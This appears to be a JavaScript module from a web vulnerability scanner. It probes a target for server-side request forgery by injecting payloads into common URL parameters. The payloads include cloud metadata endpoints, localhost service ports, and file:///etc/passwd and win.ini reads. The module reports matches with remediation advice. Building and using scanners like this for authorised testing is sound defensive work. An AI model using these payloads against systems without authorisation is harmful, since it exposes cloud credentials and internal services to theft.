const SSRF_PARAMS = ['url', 'uri', 'file', 'path', 'src', 'href', 'source', 'dest', 'redirect', 'location', 'page', 'load', 'read', 'document', 'link', 'fetch', 'include', 'import', 'resource'];
const SSRF_PAYLOADS = [
  { payload: 'http://169.254.169.254/latest/meta-data/', name: 'AWS Metadata (IMDSv1)', severity: 'critical' },
  { payload: 'http://169.254.169.254/latest/user-data/', name: 'AWS User Data', severity: 'critical' },
  { payload: 'http://metadata.google.internal/', name: 'GCP Metadata', severity: 'critical' },
  { payload: 'http://100.100.100.200/latest/meta-data/', name: 'Alibaba Cloud Metadata', severity: 'critical' },
  { payload: 'http://127.0.0.1:22', name: 'Localhost SSH', severity: 'high' },
  { payload: 'http://127.0.0.1:80', name: 'Localhost HTTP', severity: 'high' },
  { payload: 'http://127.0.0.1:443', name: 'Localhost HTTPS', severity: 'high' },
  { payload: 'http://127.0.0.1:3306', name: 'Localhost MySQL', severity: 'medium' },
  { payload: 'http://127.0.0.1:6379', name: 'Localhost Redis', severity: 'medium' },
  { payload: 'file:///etc/passwd', name: 'Local File Read', severity: 'high' },
  { payload: 'file:///c:/windows/win.ini', name: 'Windows File Read', severity: 'high' },
  { payload: 'http://[::1]:22', name: 'IPv6 Localhost SSH', severity: 'high' },
  { payload: 'http://0.0.0.0:22', name: 'Zero-address SSH', severity: 'high' },
];

async function scanSSRF(targetUrl, httpClient) {
  const vulnerabilities = [];
  const baseUrl = targetUrl.replace(/\/$/, '');

  for (const param of SSRF_PARAMS) {
    for (const test of SSRF_PAYLOADS) {
      try {
        const testUrl = `${baseUrl}?${param}=${encodeURIComponent(test.payload)}`;
        const response = await httpClient.get(testUrl, {
          timeout: 10000,
          headers: { 'User-Agent': process.env.USER_AGENT || 'WebSecurityScanner/1.0' },
          validateStatus: s => s < 500,
        });
        const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data || '');
        const isMetaData = test.payload.includes('meta-data') || test.payload.includes('user-data');
        const hasMetaData = isMetaData && (body.includes('ami-id') || body.includes('instance-id') || body.includes('hostname') || body.includes('meta-data'));
        const hasPasswd = test.payload.includes('/etc/passwd') && body.includes('root:');
        const hasWinIni = test.payload.includes('win.ini') && body.includes('[fonts]');
        const hasResponse = body.length > 0 && body.length < 50000;

        if (hasMetaData || hasPasswd || hasWinIni) {
          vulnerabilities.push({
            type: 'ssrf',
            severity: test.severity,
            title: `Server-Side Request Forgery (SSRF) - ${test.name}`,
            description: `Parameter "${param}" appears to make requests to user-controlled URLs. This can be used to access internal services.`,
            endpoint: baseUrl,
            parameter: param,
            payload: `${param}=${test.payload}`,
            evidence: `Test URL: ${testUrl}\nParameter: ${param}\nPayload: ${test.payload}\nResponse length: ${body.length}\nIndicator matched in response`,
            remediation: 'Use an allowlist of permitted URLs/protocols. Disable unnecessary URL schemes (file://, dict://, gopher://). Validate and sanitize all URL parameters. Use a dedicated URL parser.',
            owasp_category: 'A10:2021 – Server-Side Request Forgery (SSRF)',
            cve_id: 'CWE-918',
          });
          break;
        }
      } catch (err) {
        continue;
      }
    }
  }
  return vulnerabilities;
}

module.exports = { scanSSRF, SSRF_PARAMS, SSRF_PAYLOADS };